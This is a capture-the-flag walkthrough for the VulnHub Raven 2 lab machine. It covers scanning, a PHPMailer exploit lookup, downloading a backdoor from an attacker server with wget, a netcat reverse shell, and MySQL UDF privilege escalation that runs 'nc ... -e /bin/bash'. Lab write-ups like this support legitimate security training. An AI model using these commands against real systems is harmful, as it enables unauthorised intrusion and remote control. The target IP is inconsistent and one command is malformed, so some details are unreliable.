# CTF Walkthrough: Raven Machine

https://www.vulnhub.com/entry/raven-2,269/

## Machine Details
- **Target IP:** 10.10.10.13
- **Difficulty:** Medium
- **Technologies:** 
  - Debian Linux
  - Apache 2.4.10
  - OpenSSH 6.7p1
  - WordPress
  - MySQL

## 1. Setup Instructions
- Prepare Kali Linux virtual machine
- Configure network settings
- Install necessary penetration testing tools
  - nmap
  - dirb
  - searchsploit
  - netcat
  - python

## 2. Reconnaissance (Recon)

### Network Scanning
```bash
# Discover network hosts
netdiscover -r 10.10.10.0/24

# Comprehensive port scanning
nmap -sV -v -Pn 10.10.10.13
nmap -sC -A -v -p- 10.10.10.13
```

### Scan Results
```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind 2-4 (RPC #100000)
MAC Address: 08:00:27:14:CC:04 (Oracle VirtualBox virtual NIC)
```

## 3. Enumeration

### Web Directory Exploration
```bash
dirb http://10.10.10.20 /usr/share/wordlists/dirb/big.txt
```

### Discovered Directories
- `/css/`
- `/fonts/`
- `/img/`
- `/js/`
- `/manual/`
- `/vendor/` 
- `/wordpress/`

### Key Observations
- `http://10.10.10.20/wordpress/wp-content/uploads/` contains a flag
- `server-status` endpoint returns 403 Forbidden

## 4. Vulnerability Identification

### Initial Vulnerability Research
```bash
# Search for PHPMailer exploits
searchsploit phpmailer

# Copy specific exploit
searchsploit -m 40974.py
```

### Exploit Preparation Notes
‚ö†Ô∏è **Potential Installation Requirements**
```bash
# If requests_toolbelt module is missing
pip3 install requests-toolbelt
```

## 5. Exploitation Techniques

### Reverse Shell Establishment
```bash
# Set up listener on attacker machine
nc -nlvp 443

# Open backdoor in browser
/path/to/backdoor

# Upgrade to interactive shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

### Initial Access
```bash
# Verify initial access
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Change to temporary directory
cd /tmp
```

### Data Transfer Techniques
```bash
# Simple HTTP server on attacker machine
python -m http.server <port>

# Download backdoor on target
wget http://<attacker_ip>:<port>/backdoor
```

## 6. Privilege Escalation

### MySQL Exploitation Method
```sql
# Select MySQL database
use mysql

# Create blob table
CREATE TABLE bb (line BLOB);

# Load malicious library
INSERT INTO bb VALUES(LOAD_FILE('/tmp/mysql20.so'));

# Move library to plugin directory
SELECT * FROM bb INTO DUMPFILE '/usr/lib/mysql/plugin/mysql20.so';

# Verify plugin directory
SHOW VARIABLES LIKE 'plugin_dir';

# Create system function
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'mysql20.so';

# Execute reverse shell
select do_system('nc 10.10.10.4 80 -e /bin/bash');
```

### Privilege Escalation Notes
- Verify root processes
```bash
find ps -aux | grep root
```

## 7. Post-Exploitation
- Maintained system access
- Explored system information
- Identified potential further exploitation paths

## 8. Flag Collection
- Check WordPress uploads directory
- Search for flag files in various locations

## 9. Conclusion
- Successfully exploited MySQL functionality
- Gained www-data shell
- Demonstrated potential privilege escalation

## 10. Recommendations
- Update PHPMailer to latest version
- Restrict MySQL plugin directory permissions
- Implement stronger input validation

## Appendix: Potential Challenges

### Technical Challenges
- Module compatibility issues
- Precise exploit modification
- Shell stabilization

### Debugging Tips
- Always verify module installations
- Check full library paths
- Use systematic exploitation approach

## Author's Notes
üîç **Key Insights**
- Exploit paths may require customization
- Persistent testing is crucial
- Always have backup exploitation strategies

